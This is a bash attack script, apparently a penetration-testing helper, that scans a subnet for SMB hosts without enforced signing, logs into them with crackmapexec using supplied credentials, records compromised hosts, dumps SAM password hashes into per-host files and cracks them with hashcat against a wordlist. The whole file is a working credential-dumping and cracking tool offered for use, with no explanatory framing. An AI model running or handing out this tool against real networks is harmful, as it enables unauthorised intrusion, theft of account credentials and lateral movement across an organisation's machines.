#!/usr/bin/env bash

print_help() 
{
	printf "Usage $0 [-t target] [-u username] [-p password]\n"
	printf -- "-t: The subnet to test.\n"
	printf -- "-u: Usename to authenticate with.\n"
	printf -- "-p: Password to authenticate with.\n"
    	printf -- "-w: The wordlist to crack hashes with\n"
	printf -- "-h: Display this help message.\n"
}

printf_r() { printf "\033[1m\033[31m%s\033[0m\n" "$1"; }
printf_g() { printf "\033[1m\033[92m%s\033[0m\n" "$1"; }
printf_b() { printf "\033[1m%s\033[0m\n" "$1"; }

flag_t=0
flag_u=0
flag_p=0
flag_w=0

printf_b "[*] Script starting at $(date)"
start=$( date +%s )

while getopts t:u:p:w:h: args
do
	case "${args}" in
		t) target=${OPTARG}; flag_t=$((flag_t+1));;
		u) user=${OPTARG}; flag_u=$((flag_u+1));;
		p) pass=${OPTARG}; flag_p=$((flag_p+1));;
        	w) wordlist=${OPTARG}; flag_w=$((flag_w+1));;
		h) print_help;;
		:) printf "Error: Option -$OPTARG requires an argument\n" >&2; print_help; exit 1;;
		\?) printf "Error: Invalid option\n" >&2; print_help; exit 1;;
	esac
done

if [ `echo $EUID -ne 0` ]; then
	printf_r "[-] Warning: This script needs root privileges to function properly. Quitting..." >&2
	exit 1
fi

# check num args
if [ $flag_t -ne 1 ] || [ $flag_u -ne 1 ] || [ $flag_p -ne 1 ] || [ $flag_w -ne 1 ]; then
	printf "Error: Each flag (-t, -u, -p, -w) only takes 1 argument.\n" >&2
	print_help
	exit 1
fi


octet_regex="^25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9][0-9]?$"
cidr_regex="^3[0-2]|[1-2]?[0-9]$"
ip_regex="^$octet_regex\.$octet_regex\.$octet_regex\.$octet_regex$"
subnet_regex="^$ip_regex/$cidr_regex$"

if ! [[ "$target" =~ $subnet_regex ]]; then
	printf "Error: Invalid subnet\n"
	print_help
	exit 1
fi

#if [  ]
dir_name=${target//\//-}
if [[ ! -d "$dir_name" ]]; then
	mkdir "$dir_name"
fi

if [[ ! -d "$dir_name/credentials" ]]; then
	mkdir "$dir_name/credentials"
fi

printf_b "[*] Starting Nmap scan..."
scan_result=$( nmap "$target" -p139,445 -Pn --script=smb2-security-mode | tee /dev/tty )

# Check for smb signing policy
has_ip=false
ip_addr=()
ip_index=0
sign_mode=()
sign_index=0

# T for signing enforced, F for not enforced, and N for smb not enabled on port 139 or 445
while read -r line
do
	if echo "$line" | grep -q "Nmap scan report for"; then
		if $has_ip; then
			sign_index=$(( sign_index+1 ))
		fi
		sign_mode[$sign_index]='N'
		has_ip=true
		ip_addr[$ip_index]=$(echo "$line" | awk '{print $5}')
		ip_index=$(( ip_index+1 ))
		
	elif echo "$line" | grep -q "Message signing enabled but not required"; then
		sign_mode[$sign_index]='F'
		sign_index=$(( sign_index+1 ))
		has_ip=false
		
	elif echo "$line" | grep -q "Message signing enabled and required"; then
		sign_mode[$sign_index]='T'
		sign_index=$(( sign_index+1 ))
		has_ip=false
	fi	
done <<< "$scan_result"

num_unrequired_hosts=0
num_smb_hosts=0
net_hosts=0

for (( i=0; i<${#ip_addr[@]}; i++ ))
do
	echo "${ip_addr[$i]}" >> "$dir_name/up_hosts.txt"
	net_hosts=$(( net_hosts+1 ))
	case "${sign_mode[$i]}" in 
		'T') echo "${ip_addr[$i]}" >> "$dir_name/smb_signing_required_hosts.txt"; num_smb_hosts=$(( num_smb_hosts+1 ));;
		'F') echo "${ip_addr[$i]}" >> "$dir_name/smb_signing_unrequired_hosts.txt"; num_unrequired_hosts=$(( num_unrequired_hosts+1 )); num_smb_hosts=$(( num_smb_hosts+1 ));;
		'N') continue;;
		*) printf_r "WARNING: Unexpected sign mode '${sign_mode[$i]}' for ${ip_addr[$i]}" >&2
	esac
done

#printf "scan result: $scan_result\n"
printf_g "[+] Nmap scan complete, $num_smb_hosts/$net_hosts have smb open on ports 139 or 445, $num_unrequired_hosts/$net_hosts do not enforce smb signing."

# Pass the credentials
cred_regex=".+\:[0-9]+\:[a-f0-9]{32}\:[a-f0-9]{32}"

password_authentication()
{
	printf_b "[*] Attempting domain authentication..." 
	domain_auth=$( crackmapexec smb "$target" -u "$1" -p "$2" --sam | tee /dev/tty )

	while read -r line
	do
		if echo "$line" | grep -q "Pwn3d!"; then
			echo $( echo "$line" | awk '{print $2}' ) >> "$dir_name/pwned_hosts.txt"
		fi
		
		if [[ "$line" =~ $cred_regex ]]; then
			host_creds="$( echo "$line" | awk '{print $2}')_dump.txt"
			echo "$line" >> "$dir_name/credentials/$host_creds"
			host_hashes="$( echo "$line" | awk '{print $2}')_hashes.txt"
			echo $( echo "$line" | cut -d ':' -f 4 ) >> "$dir_name/credentials/$host_hashes"
		fi
	done <<< "$domain_auth"

	printf_b "[*] Attempting local authentication..."
	local_auth=$( crackmapexec smb "$target" -u "$1" -p "$2" --local-auth --sam | tee /dev/tty )

	while read -r line
	do
		if echo "$line" | grep -q "Pwn3d!"; then
			echo $( echo "$line" | awk '{print $2}' ) >> "$dir_name/pwned_hosts.txt"
		fi
		
		if [[ "$line" =~ $cred_regex ]]; then
			host_creds="$( echo "$line" | awk '{print $2}')_dump.txt"
			echo "$line" >> "$dir_name/credentials/$host_creds"
			host_hashes="$( echo "$line" | awk '{print $2}')_hashes.txt"
			echo $( echo "$line" | cut -d ':' -f 4 ) >> "$dir_name/credentials/$host_hashes"
		fi
	done <<< "$local_auth"
}

password_authentication "$user" "$pass"

printf_g "[+] Finished dump, cracking hashes..."
hashcat "$dir_name/credentials/$host_hashes" -m 1000 -a 0 "$wordlist"


printf_g "[+] Hashcracking complete"
echo $( hashcat -m 1000 --show "$dir_name/credentials/$host_hashes" | tee /dev/tty) > "$dir_name/credentials/cracked_hashes.txt"

printf_b "[*] Script completed at $(date)"
end=$( date +%s )

runtime=$(( $end - $start ))
printf_b "Script runtime: $runtime seconds"
